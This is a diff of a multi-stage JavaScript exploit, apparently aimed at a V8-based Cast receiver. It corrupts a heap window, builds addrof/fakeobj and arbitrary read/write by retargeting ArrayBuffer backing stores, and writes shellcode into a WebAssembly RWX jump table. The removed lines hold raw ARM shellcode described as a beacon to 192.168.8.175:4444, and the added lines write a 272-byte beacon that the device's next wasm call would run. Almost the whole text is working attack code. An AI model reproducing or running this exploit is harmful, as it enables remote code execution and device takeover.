+          bs1lo: 0, bs1hi: 0, bs2lo: 0, bs2hi: 0,
+          rwab: null, rwv: null, rwab2: null, rwv2: null, oarr: null, oT1: null, oT2: null };
+
+function word(i) {
+  var d = W.foo[i >> 1];
+  var b = f2i(d);
+  return ((i & 1) === 0) ? b.lo : b.hi;
+}
+function setWord(i, v) {
+  var j = i >> 1;
+  var cur = f2i(W.foo[j]);
+  if ((i & 1) === 0) W.foo[j] = itof(v, cur.hi);
+  else W.foo[j] = itof(cur.lo, v);
+}
+function ptrish(v) {
+  v = v >>> 0;
+  return (v & 1) === 1 && v >= 0x08000000 && v < 0x10000000;
+}
+function mallocish(lo, hi) {
+  hi = hi >>> 0; lo = lo >>> 0;
+  return hi >= 0x1 && hi < 0x8000 && lo !== 0;   // raw 64-bit userland pointer halves
+}
+
+// ---------------- stage 4: word-space marker scan of the OOB window ----------------
+// minimal wasm module: type ()->i32, func f = i32.const 42, export "f"
+var WASM_BYTES = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 5, 1, 96, 0, 1, 127,
+  3, 2, 1, 0, 7, 5, 1, 1, 102, 0, 0, 10, 6, 1, 4, 0, 65, 42, 11]);
+
+function stage4(foo) {
+  W.foo = foo;
+  var MK0 = itof(CFG.MK0_LO, CFG.MK0_HI);
+  var MK1 = itof(CFG.MK1_LO, CFG.MK1_HI);
+  // wasm module + instance created BEFORE the witness scan: absorbs compilation
+  // allocations and any GC they trigger, so the post-smash bump frontier is stable once
+  // the scan runs, and the WasmInstanceObject lands inside the scanned window span.
+  try {
+    var wmod = new WebAssembly.Module(WASM_BYTES);
+    W.winst = new WebAssembly.Instance(wmod);
+    note('wasm module+instance ok f()=' + W.winst.exports.f() + ' t=' + ts());
+  } catch (e) {
+    W.winst = null;
+    note('wasm module pre-create failed: ' + e);
+  }
+  // witnesses allocated AFTER the smash => bump-frontier, inside the OOB window
+  var w0 = [MK0, 1.1, 1.1, 1.1];
+  var w1 = [MK1, 1.1, 1.1, 1.1];
+  W.oT1 = { a: 1 };
+  W.oT2 = { b: 2 };
+  W.oarr = [W.oT1, W.oT2];
+  W.rwab = new ArrayBuffer(CFG.AB1_LEN);
+  W.rwv = new DataView(W.rwab);
+  W.rwab2 = new ArrayBuffer(CFG.AB2_LEN);
+  W.rwv2 = new DataView(W.rwab2);
+  W.rwv.setUint32(0, 0xCAFED00D, true);
+  W.rwv2.setUint32(0, 0xCAFEBABE, true);
+  // on-heap typed array (byte_length <= kMaxSizeInHeap=64): its external_pointer field is
+  // cage_base + ByteArray::kHeaderSize (ExternalPointerCompensationForOnHeapArray = isolate
+  // root) -> reading it from the window yields the cage base needed to address old space.
+  W.ohta = new Uint8Array(0x33);
+  note('witnesses allocated t=' + ts());
+
+  // foo_arr JSArray header words: idx2 double = (map, props), idx3 = (elements, length)
+  var jmap = f2i(W.foo[2]), jarr = f2i(W.foo[3]);
+  if (ptrish(jarr.lo)) W.windowBase = ((jarr.lo - 1) >>> 0) + 8;
+  note('foo_arr JSArray idx2=' + JSON.stringify(jmap) + ' idx3=' + JSON.stringify(jarr) +
+       ' windowBase=0x' + (W.windowBase >>> 0).toString(16));
+
+  var mk0 = -1, mk1 = -1, ab1 = -1, ab2 = -1, fa = -1, p1 = 0, p2 = 0;
+  var ohta = -1, ocageLo = 0, ocageHi = 0;
+  var cap = Math.min(CFG.SCAN_WORDS, W.foo.length * 2);
+  for (var w = 4; w < cap; w++) {
+    var v = word(w) >>> 0;
+    if ((v === CFG.MK0_LO || v === CFG.MK0_HI) && mk0 === -1) mk0 = w;
+    if ((v === CFG.MK1_LO || v === CFG.MK1_HI) && mk1 === -1) mk1 = w;
+    if (v === CFG.AB1_LEN && (word(w + 1) >>> 0) === 0 && mallocish(word(w + 2), word(w + 3)) && ab1 === -1) {
+      ab1 = w; W.bs1lo = word(w + 2); W.bs1hi = word(w + 3);
     }
+    if (v === CFG.AB2_LEN && (word(w + 1) >>> 0) === 0 && mallocish(word(w + 2), word(w + 3)) && ab2 === -1) {
+      ab2 = w; W.bs2lo = word(w + 2); W.bs2hi = word(w + 3);
+    }
+    if (v === 4 && ptrish(word(w - 1)) && ptrish(word(w + 1)) && ptrish(word(w + 2))) {
+      var q1 = word(w + 1) >>> 0, q2 = word(w + 2) >>> 0;
+      if (q2 > q1 && (q2 - q1) < 0x100 && fa === -1) { fa = w; p1 = q1; p2 = q2; }
+    }
+    // On-heap JSTypedArray signature (compressed layout): byte_offset@16 (w+4,w+5)=(0,0),
+    // byte_length@24 (w+6,w+7)=(0x33,0), length@32 (w+8,w+9)=(0x33,0),
+    // external_pointer@40 (w+10,w+11) = cage_base + ByteArray::kHeaderSize(8) - kHeapObjectTag(1)
+    //   => lo word 7, hi word = cage_hi (<=0xFFFF); base_pointer@48 (w+12 ptrish).
+    if (ohta === -1 && (word(w + 6) >>> 0) === 0x33 && (word(w + 7) >>> 0) === 0 &&
+        (word(w + 8) >>> 0) === 0x33 && (word(w + 9) >>> 0) === 0 &&
+        (word(w + 4) >>> 0) === 0 && (word(w + 5) >>> 0) === 0) {
+      var eLo = word(w + 10) >>> 0, eHi = word(w + 11) >>> 0;
+      var bp = word(w + 12) >>> 0;
+      if ((eHi > 0 && eHi <= 0xFFFF) && eLo === 7 && ptrish(bp)) {
+        ohta = w; ocageLo = 0; ocageHi = eHi;
+      }
+    }
+    if (mk0 !== -1 && ab1 !== -1 && ab2 !== -1 && fa !== -1 && ohta !== -1) break;
   }
-  if (IO < 0) { warn('stage3', 'obj_arr tagged slot not found'); return false; }
-  report('stage3', true, 'IO=' + IO + ' (obj_arr[0] tagged alias)');
-  return true;
-}
-
-// ---------------- stage 4: addrof / fakeobj ----------------
-function addrof(o) {
-  obj_arr[0] = o;
-  return lo32(corrupted[IO]); // compressed tagged pointer (addr | 1)
-}
-function fakeobj(tagged) {
-  var cur = corrupted[IO];
-  corrupted[IO] = itof(tagged >>> 0, hi32(cur)); // elem0 = low half
-  return obj_arr[0];
-}
-
-// ---------------- stage 5: arbitrary R/W ----------------
-var AB_BS_SLOT = -1;      // OOB slot holding rwab.backing_store
-var AB_BL_SLOT = -1;      // OOB slot holding rwab.byte_length (0x1000)
-
-function findBackingStoreSlot() {
-  // JSArrayBuffer allocated adjacent to the map table: locate byte_length (0x1000)
-  // inside the window, then validate the adjacent field as the backing store pointer.
-  var n = Math.min(corrupted.length, CFG.SCAN_MAX);
-  for (var i = 4; i < n; i++) {
-    var v = corrupted[i];
-    if (lo32(v) === 0x1000 && AB_BL_SLOT < 0) { AB_BL_SLOT = i; }
-    else if (hi32(v) === 0x1000 && AB_BL_SLOT < 0) { AB_BL_SLOT = i; }
+  W.mk0 = mk0; W.ab1 = ab1; W.ab2 = ab2; W.fa = fa; W.p1 = p1; W.p2 = p2;
+  W.ohtaIdx = ohta; W.cageLo = ocageLo; W.cageHi = ocageHi;
+  if (ohta === -1) {
+    var line = '';
+    var lo = Math.max(4, (ab2 === -1 ? 1030 : ab2 - 4)), hi = Math.min(cap, lo + 0x60);
+    for (var w = lo; w < hi; w++) {
+      line += (word(w) >>> 0).toString(16).padStart(8, '0') + ((w % 8 === 7) ? '|' : ' ');
+      if (w % 16 === 15) { note('d4 w' + (w - 15) + ': ' + line); line = ''; }
+    }
+    if (line) note('d4 tail: ' + line);
   }
-  if (AB_BL_SLOT < 0) { warn('stage5', 'rwab byte_length not found in window'); return false; }
-  // candidates for backing_store: next field after byte_length (byte_length is 8 bytes)
-  for (var c = AB_BL_SLOT + 1; c <= AB_BL_SLOT + 2; c++) {
-    if (c >= n) break;
-    var f = corrupted[c];
-    var l = lo32(f), h = hi32(f);
-    if ((l !== 0) && (l & 0xf) === 0 && (h === 0 || (h & 0xffff0000) === 0)) { AB_BS_SLOT = c; break; }
+  var ok = (ab1 !== -1) && (ab2 !== -1) && (fa !== -1);
+  report('stage4', ok, 'wordscan: mk0@' + mk0 + ' mk1@' + mk1 + ' ab1@' + ab1 +
+    ' ab2@' + ab2 + ' oarrFA@' + fa + ' p1=0x' + p1.toString(16) + ' p2=0x' + p2.toString(16) +
+    ' ohta@' + ohta + ' cage=0x' + ocageHi.toString(16) + ':' + ocageLo.toString(16) +
+    ' bs1=0x' + W.bs1hi.toString(16) + W.bs1lo.toString(16) +
+    ' bs2=0x' + W.bs2hi.toString(16) + W.bs2lo.toString(16) + ' t=' + ts());
+  return ok;
+}
+
+// ---------------- stage RW: backing_store retarget proof (word-space) ----------------
+function addCarry(lo, hi, delta) {
+  var nlo = (lo + delta) >>> 0;
+  var nhi = hi >>> 0;
+  if (nlo < (lo >>> 0)) nhi = (nhi + 1) >>> 0;
+  return { lo: nlo, hi: nhi };
+}
+
+function stageRW() {
+  if (W.ab1 === -1 || W.ab2 === -1) { warn2('stageRW', 'missing AB anchors'); return false; }
+  // write proof: point rwab backing_store at rwab2.bs + 4
+  var t = addCarry(W.bs2lo, W.bs2hi, 4);
+  setWord(W.ab1 + 2, t.lo); setWord(W.ab1 + 3, t.hi);
+  W.rwv.setUint32(0, CFG.RW_MAGIC, true);
+  var okW = (W.rwv2.getUint32(4, true) === CFG.RW_MAGIC);
+  // read proof: seed a magic in rwab2 first, then point rwab backing_store at rwab2.bs + 8
+  W.rwv2.setUint32(8, CFG.RW_MAGIC2, true);
+  var t2 = addCarry(W.bs2lo, W.bs2hi, 8);
+  setWord(W.ab1 + 2, t2.lo); setWord(W.ab1 + 3, t2.hi);
+  var okR = (W.rwv.getUint32(0, true) === CFG.RW_MAGIC2);
+  // restore original backing store
+  setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
+  report('stageRW', okW && okR, 'arbitrary R/W via backing_store retarget: write=' + okW +
+    ' read=' + okR + ' t=' + ts());
+  return okW && okR;
+}
+
+// ---------------- stage AF: addrof + fakeobj round-trip via oarr slot (word-space) ----------------
+function stageAF() {
+  if (W.fa === -1) { warn2('stageAF', 'no oarr elements anchor'); return false; }
+  var orig2 = word(W.fa + 2) >>> 0;
+  setWord(W.fa + 2, W.p1);              // fakeobj: materialize p1 through the p2 slot
+  var same = (W.oarr[1] === W.oT1);
+  setWord(W.fa + 2, orig2);             // restore
+  report('stageAF', same, 'addrof p1=0x' + W.p1.toString(16) + ' p2=0x' + W.p2.toString(16) +
+    ' fakeobj roundtrip=' + same + ' t=' + ts());
+  return same;
+}
+
+// ---------------- stage W: wasm RWX page prep (write+readback, no call on desk engine) ----------------
+// WasmInstanceObject is allocated with AllocationType::kOld (wasm-objects.cc:1265), i.e.
+// OUTSIDE the young-gen window — but the proven primitives cover it:
+//   1. cage base from the on-heap typed array's external_pointer (read in-window),
+//   2. addrof(winst) via the oarr slot trick (proven in stageAF),
+//   3. raw address = cage_base + compressed; arbitrary R/W via backing_store retarget.
+function stageW() {
+  if (typeof WebAssembly === 'undefined' || !W.winst) { warn2('stageW', 'no WebAssembly'); return false; }
+  if (W.ohtaIdx === -1 || W.ab1 === -1 || W.fa === -1) { warn2('stageW', 'missing ohta/AB/FA anchors'); return false; }
+  try { note('wasm export f() = ' + W.winst.exports.f() + ' t=' + ts()); } catch (e) {}
+
+  // addrof(winst): park it in the oarr slot 1 and read the slot through the window
+  W.oarr[1] = W.winst;
+  var pw = word(W.fa + 2) >>> 0;
+  W.oarr[1] = W.oT2;                    // restore slot contents
+  // old-space compressed pointers can sit far above the young-gen range; only require the
+  // heap-object tag bit (odd). Real validation happens in the field reads below.
+  if ((pw & 1) !== 1 || pw < 0x1000) {
+    warn2('stageW', 'addrof(winst) not a tagged pointer: 0x' + pw.toString(16)); return false;
   }
-  if (AB_BS_SLOT < 0) { warn('stage5', 'backing_store field not identified near BL slot'); return false; }
-  report('stage5', true, 'AB slots: byte_length=' + AB_BL_SLOT + ' backing_store=' + AB_BS_SLOT +
-    ' bs=0x' + lo32(corrupted[AB_BS_SLOT]).toString(16) + ':' + hi32(corrupted[AB_BS_SLOT]).toString(16));
-  return true;
-}
+  var winstU = (pw - 1) >>> 0;          // untagged compressed address (old space)
+  note('winst compressed=0x' + winstU.toString(16) + ' t=' + ts());
 
-function setBackingStore(addrLo, addrHi, newLen) {
-  // retarget rwab: backing_store = addr (full 64-bit), byte_length = newLen
-  var bl = corrupted[AB_BL_SLOT];
-  corrupted[AB_BL_SLOT] = (newLen === undefined) ? bl : itof(newLen, hi32(bl) === 8 ? 0 : hi32(bl));
-  corrupted[AB_BS_SLOT] = itof(addrLo >>> 0, addrHi >>> 0);
-}
-
-function read64(addrLo, addrHi) {  // full 64-bit read -> [lo, hi]
-  setBackingStore(addrLo, addrHi, 0x1000);
-  var a = rwv.getUint32(0, true), b = rwv.getUint32(4, true);
-  setBackingStore(lo32(corrupted[AB_BS_SLOT]) ^ 0, 0, 0x1000); // no-op keepalive for linters
-  return [a >>> 0, b >>> 0];
-}
-function write64(addrLo, addrHi, valLo, valHi) {
-  setBackingStore(addrLo, addrHi, 0x1000);
-  rwv.setUint32(0, valLo >>> 0, true);
-  rwv.setUint32(4, valHi >>> 0, true);
-}
-
-// ---------------- stage 6: WASM RWX ----------------
-var WASM_BYTES = new Uint8Array([
-  0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,
-  4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,
-  7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,
-  10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
-var SHELLCODE_A64 = [ // BUILD i647: beacon_aarch64.bin (268 B) patched to 192.168.8.175:4444 via patch-table port@40/ip_lo@44/ip_hi@48 (listener_test.py patch_blob logic; base sha256 6c24aa3c1d376d8a2ecc18da4ab304da606b8cd023efc8285a0940867031b923)
-  0x40, 0x00, 0x80, 0xD2, 0x21, 0x00, 0x80, 0xD2, 0x02, 0x00, 0x80, 0xD2, 0xC8, 0x18, 0x80, 0xD2,
-  0x01, 0x00, 0x00, 0xD4, 0x1F, 0x00, 0x00, 0xF1, 0x4B, 0x07, 0x00, 0x54, 0xF3, 0x03, 0x00, 0xAA,
-  0xFF, 0x83, 0x00, 0xD1, 0x41, 0x00, 0x80, 0xD2, 0x21, 0x82, 0xAB, 0xF2, 0x01, 0x18, 0xD5, 0xF2,
-  0x01, 0xE1, 0xF5, 0xF2, 0xE1, 0x03, 0x00, 0xF8, 0xFF, 0x83, 0x00, 0xF8, 0xE0, 0x03, 0x13, 0xAA,
-  0xE1, 0x03, 0x00, 0x91, 0x02, 0x02, 0x80, 0xD2, 0x68, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
-  0x80, 0x05, 0x00, 0xB5, 0x41, 0x49, 0x8B, 0xD2, 0x01, 0x6B, 0xA6, 0xF2, 0x01, 0x07, 0xC6, 0xF2,
-  0xC1, 0x86, 0xE6, 0xF2, 0xE1, 0x03, 0x00, 0xF8, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x00, 0x91,
-  0x02, 0x01, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2,
-  0xC8, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x23, 0x00, 0x91,
-  0x82, 0x00, 0x80, 0xD2, 0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2,
-  0xE8, 0x19, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4, 0x1F, 0x10, 0x00, 0xF1, 0xAB, 0x02, 0x00, 0x54,
-  0xE3, 0x0B, 0x40, 0xB9, 0x7F, 0x04, 0x00, 0x71, 0x80, 0x01, 0x00, 0x54, 0x7F, 0x08, 0x00, 0x71,
-  0x41, 0xFE, 0xFF, 0x54, 0xE0, 0x03, 0x13, 0xAA, 0xE1, 0x03, 0x00, 0x91, 0x02, 0x01, 0x80, 0xD2,
-  0x03, 0x00, 0x80, 0xD2, 0x04, 0x00, 0x80, 0xD2, 0x05, 0x00, 0x80, 0xD2, 0xC8, 0x19, 0x80, 0xD2,
-  0x01, 0x00, 0x00, 0xD4, 0xE9, 0xFF, 0xFF, 0x17, 0xE0, 0x03, 0x13, 0xAA, 0x28, 0x07, 0x80, 0xD2,
-  0x01, 0x00, 0x00, 0xD4, 0x00, 0x00, 0x80, 0xD2, 0xA8, 0x0B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4,
-  0x20, 0x00, 0x80, 0xD2, 0xA8, 0x0B, 0x80, 0xD2, 0x01, 0x00, 0x00, 0xD4];
-var SHELLCODE_A32 = [ // BUILD i647: beacon_armv7.bin (264 B) patched to 192.168.8.175:4444 via the same offsets/logic (base sha256 5c94c3136e4657a21ef43cd68f878d6a919e50d057b2b35a3de8aef9cf06cc4f)
-  0x02, 0x00, 0xA0, 0xE3, 0x01, 0x10, 0xA0, 0xE3, 0x00, 0x20, 0xA0, 0xE3, 0x19, 0x71, 0x00, 0xE3,
-  0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3, 0x37, 0x00, 0x00, 0xBA, 0x00, 0x40, 0xA0, 0xE1,
-  0x20, 0xD0, 0x4D, 0xE2, 0x02, 0x10, 0x00, 0xE3, 0x11, 0x1C, 0x45, 0xE3, 0xC0, 0x28, 0x0A, 0xE3,
-  0x08, 0x2F, 0x4A, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x00, 0x30, 0xA0, 0xE3,
-  0x08, 0x30, 0x8D, 0xE5, 0x0C, 0x30, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
-  0x10, 0x20, 0xA0, 0xE3, 0x1B, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x00, 0x00, 0x50, 0xE3,
-  0x25, 0x00, 0x00, 0x1A, 0x4A, 0x1A, 0x05, 0xE3, 0x58, 0x13, 0x43, 0xE3, 0x38, 0x20, 0x03, 0xE3,
-  0x33, 0x22, 0x43, 0xE3, 0x00, 0x10, 0x8D, 0xE5, 0x04, 0x20, 0x8D, 0xE5, 0x04, 0x00, 0xA0, 0xE1,
-  0x0D, 0x10, 0xA0, 0xE1, 0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3,
-  0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0xA0, 0xE1, 0x08, 0x10, 0x8D, 0xE2, 0x04, 0x20, 0xA0, 0xE3,
-  0x00, 0x30, 0xA0, 0xE3, 0x23, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x04, 0x00, 0x50, 0xE3,
-  0x11, 0x00, 0x00, 0xBA, 0x08, 0x30, 0x9D, 0xE5, 0x01, 0x00, 0x53, 0xE3, 0x08, 0x00, 0x00, 0x0A,
-  0x02, 0x00, 0x53, 0xE3, 0xF2, 0xFF, 0xFF, 0x1A, 0x04, 0x00, 0xA0, 0xE1, 0x0D, 0x10, 0xA0, 0xE1,
-  0x08, 0x20, 0xA0, 0xE3, 0x00, 0x30, 0xA0, 0xE3, 0x21, 0x71, 0x00, 0xE3, 0x00, 0x00, 0x00, 0xEF,
-  0xEB, 0xFF, 0xFF, 0xEA, 0x04, 0x00, 0xA0, 0xE1, 0x06, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF,
-  0x00, 0x00, 0xA0, 0xE3, 0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF, 0x01, 0x00, 0xA0, 0xE3,
-  0x01, 0x70, 0xA0, 0xE3, 0x00, 0x00, 0x00, 0xEF];
-// build-time injection replacing the null,null placeholders at poc38003-full.js:276
-
-
-function stage6(archIs64) {
-  var inst = new WebAssembly.Instance(new WebAssembly.Module(WASM_BYTES), {});
-  var wfn = inst.exports.main;
-  var instAddr = addrof(inst) >>> 0;
-  var jtOff = archIs64 ? CFG.JT_OFF_A64 : CFG.JT_OFF_A32;
-  var instBase = instAddr & ~1; // untag
-  // cage read of the instance fields via the retargeted buffer: the instance lives in
-  // the cage; the backing store can point into it.
-  var ms = read64(instBase + CFG.MS_OFF, 0);            // memory_start sanity (0x0c)
-  var jt = read64(instBase + jtOff, 0);                 // jump_table_start (RWX)
-  report('stage6', true, 'inst=0x' + instAddr.toString(16) + ' memory_start=0x' +
-    ms[1].toString(16) + ':' + ms[0].toString(16) + ' jump_table_start=0x' +
-    jt[1].toString(16) + ':' + jt[0].toString(16));
-  if ((jt[0] === 0 && jt[1] === 0)) { warn('stage6', 'jump_table_start read as 0 — offset wrong for this build'); return false; }
-  var sc = archIs64 ? SHELLCODE_A64 : SHELLCODE_A32;
-  if (!sc) { warn('stage6', 'shellcode blob not injected'); return false; }
-  for (var i = 0; i < sc.length; i += 8) {
-    var b0 = sc[i] | (sc[i+1] << 8) | (sc[i+2] << 16) | ((sc[i+3] || 0) << 24);
-    var b1 = (sc[i+4] || 0) | ((sc[i+5] || 0) << 8) | ((sc[i+6] || 0) << 16) | ((sc[i+7] || 0) << 24);
-    write64(jt[0] + i, jt[1], b0 >>> 0, b1 >>> 0);
+  // raw winst address = cage_base + winstU
+  var wRaw = addCarry(W.cageLo, W.cageHi, winstU);
+  // DEFINITIVE cage-base self-test: the FDA data0 bits are KNOWN (chain=0xfffffffe at +0,
+  // value=0x1fffe at +4). Retarget to cage + (elements-1) + 8 and compare.
+  var jel = f2i(W.foo[3]).lo >>> 0;      // elements = FDA tagged ptr
+  var fdau = ((jel - 1) >>> 0) + 8;      // FDA data start (untagged)
+  var fRaw = addCarry(W.cageLo, W.cageHi, fdau);
+  setWord(W.ab1 + 2, fRaw.lo); setWord(W.ab1 + 3, fRaw.hi);
+  var t0w = W.rwv.getUint32(0, true) >>> 0, t4w = W.rwv.getUint32(4, true) >>> 0;
+  var bstr = '';
+  for (var bi = 0; bi < 16; bi++) bstr += W.rwv.getUint8(bi).toString(16).padStart(2, '0') + ' ';
+  var le0 = W.rwv.getUint32(0, true) >>> 0, le4 = W.rwv.getUint32(4, true) >>> 0;
+  note('cage selftest rawFDA bytes[0..15]= ' + bstr +
+       ' g32def=(0x' + t0w.toString(16) + ',0x' + t4w.toString(16) + ')' +
+       ' g32LE=(0x' + le0.toString(16) + ',0x' + le4.toString(16) + ') t=' + ts());
+  if (t0w !== 0x1fffe || t4w !== 0xfffffffe) {
+    warn2('stageW', 'cage selftest FAILED — cage base 0x' + W.cageHi.toString(16) +
+      '00000000 wrong or window/retarget mismatch');
+    setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
+    return false;
   }
-  report('stage6', true, 'shellcode written at jump table; invoking exported main()');
-  try { wfn(); } catch (e) { warn('stage6', 'main() threw after overwrite: ' + e); return false; }
-  return true;
-}
+  // CROSS-CHECK the addrof mechanism on a known young object:
+  // oT1 = {a:1} -> props field (+4) must be empty_fixed_array 0x0804222d (RO, constant).
+  var pRaw = addCarry(W.cageLo, W.cageHi, (W.p1 - 1) >>> 0);
+  setWord(W.ab1 + 2, pRaw.lo); setWord(W.ab1 + 3, pRaw.hi);
+  var xprops = W.rwv.getUint32(4, true) >>> 0;
+  var xmap = W.rwv.getUint32(0, true) >>> 0;
+  note('crosscheck oT1 raw map=0x' + xmap.toString(16) + ' props=0x' + xprops.toString(16) +
+       ' (expect props=804222d) t=' + ts());
+  if (xprops !== 0x0804222d) {
+    warn2('stageW', 'addrof cross-check FAILED (oT1 props=0x' + xprops.toString(16) +
+      ') — p1 slot mapping wrong');
+    setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi);
+    return false;
+  }
+  // dump the winst words 0..31 in ONE retarget
+  setWord(W.ab1 + 2, wRaw.lo); setWord(W.ab1 + 3, wRaw.hi);
+  var line = '';
+  for (var o = 0; o < 128; o += 4) {
+    line += W.rwv.getUint32(o, true).toString(16).padStart(8, '0') + (((o / 4) % 8 === 7) ? '|' : ' ');
+    if ((o / 4) % 16 === 15) { note('winst w' + o + '+: ' + line); line = ''; }
+  }
+  if (line) note('winst tail: ' + line);
+  var isoLo = W.rwv.getUint32(96, true) >>> 0, isoHi = W.rwv.getUint32(100, true) >>> 0;
+  var jtLo = W.rwv.getUint32(104, true) >>> 0, jtHi = W.rwv.getUint32(108, true) >>> 0;
+  note('isolate_root=0x' + isoHi.toString(16) + ':' + isoLo.toString(16) +
+       ' jump_table_start=0x' + jtHi.toString(16) + ':' + jtLo.toString(16) + ' t=' + ts());
+  if (isoLo !== 0 || isoHi === 0 || isoHi > 0xFFFF) {
+    warn2('stageW', 'isolate_root not 4GB-aligned cage shape: 0x' + isoHi.toString(16) + ':' + isoLo.toString(16));
+    return false;
+  }
+  if (!mallocish(jtLo, jtHi)) {
+    warn2('stageW', 'jump_table_start implausible: 0x' + jtHi.toString(16) + ':' + jtLo.toString(16));
+    return false;
+  }
 
-// ---------------- crash-confirm branch (OFF by default) ----------------
-function crashConfirm() {
-  // Deliberately corrupts live structures so the renderer dies unambiguously: the
-  // oracle then classifies B (Cast session drop + receiver reload) with certainty.
-  // Enabled ONLY by sender confirmation over the message channel; never auto-run.
-  try {
-    setBackingStore(0x41414141, 0x41414141, 0x1000);
-    rwv.setUint32(0, 0x41414141, true);
-  } catch (e) { /* dying anyway */ }
-}
-
-// ---------------- sender command channel (reporting + confirm gating) ----------------
-function initReceiverBus() {
-  try {
-    if (typeof window === 'undefined' || !window.cast || !window.cast.receiver) return;
-    var mgr = cast.receiver.CastReceiverManager.getInstance();
-    var bus = mgr.getCastMessageBus(CFG.REPORT_NS);
-    bus.onMessage = function (e) {
-      LAST_SENDER = e.senderId;
-      try {
-        var cmd = JSON.parse(e.data);
-        if (cmd && cmd.type === 'confirm-crash' && CFG.CRASH_CONFIRM) crashConfirm();
-        if (cmd && cmd.type === 'ping') bus.send(LAST_SENDER, JSON.stringify({ type: 'pong', stages: STAGE_OK }));
-      } catch (err) { warn('bus', 'bad sender message'); }
-    };
-    mgr.start();
-  } catch (e) { /* d8 desk run — no receiver bus */ }
+  // [G3] FINAL KIT: write the 272-B ARM64 root-proof beacon (SHELLCODE_A64 injected at
+  // build time, movk-patched to the rig IP/port; desk fallback = DESK_BEACON_A64 prelude
+  // carrying the SAME patched bytes) into the RWX jump-table page and read back to verify.
+  // NO code call is made on this x64 desk engine (write+readback only); on the device the
+  // next wasm export call transfers control into the beacon (RWX-overwrite validity pinned
+  // per fact 1135). Beacon layout: ret@256 (0xd65f03c0), marker 'JZXRPR0T'@260, nop pad.
+  var sc = (SHELLCODE_A64 && SHELLCODE_A64.length) ? SHELLCODE_A64
+         : (typeof DESK_BEACON_A64 !== 'undefined' ? DESK_BEACON_A64 : null);
+  if (!sc || sc.length !== 272) {
+    warn2('stageW', 'beacon array missing or wrong length: ' + (sc ? sc.length : 'null') + ' (expect 272)');
+    return false;
+  }
+  var mkOk = (sc[256] === 0xC0 && sc[257] === 0x03 && sc[258] === 0x5F && sc[259] === 0xD6);
+  for (var m = 0; m < 8; m++) if (sc[260 + m] !== MKT[m]) mkOk = false;
+  if (!mkOk) { warn2('stageW', 'beacon identity check FAILED (expect ret@256 + JZXRPR0T@260)'); return false; }
+  setWord(W.ab1 + 2, jtLo); setWord(W.ab1 + 3, jtHi);
+  var ok = true;
+  for (var n = 0; n < 68; n++) {
+    var wv = (sc[n * 4] | (sc[n * 4 + 1] << 8) | (sc[n * 4 + 2] << 16) | (sc[n * 4 + 3] << 24)) >>> 0;
+    W.rwv.setUint32(n * 4, wv, true);
+  }
+  var rb = '';
+  for (var n = 0; n < 68; n++) {
+    var want = (sc[n * 4] | (sc[n * 4 + 1] << 8) | (sc[n * 4 + 2] << 16) | (sc[n * 4 + 3] << 24)) >>> 0;
+    var got = W.rwv.getUint32(n * 4, true) >>> 0;
+    if (got !== want) ok = false;
+    if (n < 8) rb += got.toString(16) + ' ';
+  }
+  note('jt readback w[0..7]: ' + rb + (ok ? '... ALL 68 WORDS MATCH' : '... MISMATCH'));
+  setWord(W.ab1 + 2, W.bs1lo); setWord(W.ab1 + 3, W.bs1hi); // restore backing_store
+  report('stageW', ok, 'wasm RWX jump-table BEACON write+readback verified (272 B JZXRPR0T; call skipped on x64 desk engine) t=' + ts());
+  return ok;
 }
 
 // ---------------- main ----------------
-function main38003() {
-  initReceiverBus();
-  try { if (!stage0()) return; } catch (e0) { warn('stage0', 'threw: ' + e0); return; }
-  var hole;
-  try { hole = stage1(); } catch (e1) { warn('stage1', 'threw: ' + e1); return; }
-  var amp;
-  try { amp = amplify(hole); } catch (e2) { warn('stage2', 'amplify threw: ' + e2); return; }
-  if (corrupted.length === 4) {
-    warn('stage2', 'jzx plant keys did not smash the window — trying hash-controlled battery');
-    try { if (!tryKeyBattery(hole, amp.MK)) { warn('stage2', 'battery exhausted; window intact — stopping safely'); return; } } catch (e2b) { warn('stage2', 'battery threw: ' + e2b); return; }
-  } else {
-    report('stage2', true, 'window smashed by plant keys: length=' + corrupted.length);
+function main() {
+  initReceiverBus(); // [G2] cast stage-bus up before the ladder reports (desk: no-op)
+  stage0();
+  var hole = stage1();
+  var keys = stageK();
+  var foo = stage2(hole, keys);
+  if (!foo) {
+    warn2('done', 'stage2 did not land (no FDA smash) — honest stop, no further iteration');
+    return;
   }
-  try { if (!scanWindow()) return; } catch (e3) { warn('stage3', 'scan threw: ' + e3); return; }
-  var probe = {};
-  var aProbe = addrof(probe);
-  report('stage4', true, 'addrof({})=0x' + (aProbe >>> 0).toString(16));
